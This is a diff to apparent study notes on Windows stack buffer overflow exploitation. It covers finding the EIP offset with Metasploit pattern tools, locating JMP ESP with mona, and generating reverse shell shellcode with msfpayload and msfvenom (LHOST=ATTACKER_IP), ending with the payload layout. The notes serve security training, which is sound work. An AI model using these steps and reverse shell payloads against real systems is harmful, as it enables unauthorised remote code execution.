@@ -6,34 +6,40 @@ Protection techniques
     Both the operating system and the binary needs to support it.
 
 Identification
-    Fuzz the app and identify a crash. Debug the app, find the instruction pointer *EIP* overwritten.
-    Determine the exact size of the buffer needed to overwrite EIP. You can generate a unique string with:
-    *$ /usr/share/metasploit-framework/tools/pattern_create.rb 2700*
-    Send the payload and find the value of EIP, and find the exact length needed with:
-    *$ /usr/share/metasploit-framework/tools/pattern_offset.rb 39694438
-[*] Exact match at offset 2606*
-    Run *badchars.py* and find potential bad characters that the application truncates. (I.E 0x00, in Pop3 new line char(0xA) as it is the command separator, etc..).
+    First step is to identify the vulnerability. You can debug the app and fuzz it with large buffers and identify a crash, crop the needed amount of data to a limited size.
+    Second step is determine the exact amount of padding before the *EIP* instruction. You can generate a large string with unique characters with:
+    *$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700*
 
-Find valid ESP address
-    Now we need to guess the address of the stack *ESP*, where our payload will land. This is the address that we need to overwrite the EIP with. The ESP address is going to change at every execution as not always the same data is loaded. You can however jump to a *JMP_ESP* that is static in a module of the app.
+    Send the payload and find the value of EIP, and find the exact length needed with:
+    *$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l STRING_LENGTH(2700) -q EIP_VALUE(37694236)
+[*] Exact match at offset 2606*
+    Next step is to generate a shellcode. Before doing that, we need to know what characters the application allows. Run *badchars.py* and find potential bad characters that the application truncates. (I.E 0x00, in Pop3 new line char(0xA) as it is the command separator, etc..).
+
+    Our objective is to inject a shellcode in beginning of the stack, replace the0 *EIP* with the address of the *ESP* and get the execution flow redirected to our shellcode. The problem is that the amount of data loaded changes every time and we can not predict the value of the ESP address. We can work around this by finding a JMP ESP instruction in memory from a module that has no *DES* or *ASLR*
 
     To find the modules that don't have ASLR and DES, you can run within the ImmunityDebugger:
     *!mona modules*
     Now, you can see how the asm *JMP_ESP* looks like in machine code by running:
-    *# /usr/share/metasploit-framework/tools/nasm_shell.rb nasm > jmp esp
-00000000 FFE4 jmp esp
+    *# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm > jmp esp
+    00000000 FFE4 jmp esp
 nasm >*
     Now you can find *FFE4* with:
     *!mona find -s '\xff\xe4' -m module.dll*
     It will find some addrs such as *0x5f4a358f*, since x86 is little endian you need to encode it as * \x8f\x35\x4a\x5f*.
     To generate the payload
 
+    So we know how much padding we need to add to the stack to overwrite the EIP, we know an address that will get the execution flow redirected to the start of the stack, we just need to create a shellcode.
+
 Develop exploit
     List all available payloads in metasploit:
     *$ msfpayload –l*
-    Generate a reverse shell shellcode:
-    *$ msfpayload windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=443 C*
+    Generate a reverse shell shellcode.
+    *$ msfpayload windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=443  -f c*
     The payload will contain illegal characters, you can filter those out using *msfencode*:
     *$ msfpayload windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=443 R | msfencode -b "\x00\x0a\x0d"*
-    Pad the remaining bits with *NOP* in hex *0x90*, so the data sent looks like:
+    Generic windows reverse shell:
+    *$ msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f  c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+    You shoul add some extra padding with *NOP* in hex *0x90* between the EIP address and the shellcode, so the data sent looks like:
     *"A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode*
+
